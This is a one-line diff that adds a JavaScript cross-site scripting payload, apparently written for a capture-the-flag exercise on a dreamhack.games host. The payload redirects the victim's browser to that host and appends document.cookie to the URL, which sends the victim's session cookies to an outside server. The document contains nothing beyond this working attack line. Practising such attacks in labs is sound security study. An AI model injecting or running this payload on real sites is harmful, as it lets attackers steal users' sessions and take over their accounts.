@@ -1,0 +1,1 @@
+location.href = "http://host1.dreamhack.games:15660/?page=vuln&param=" + document.cookie
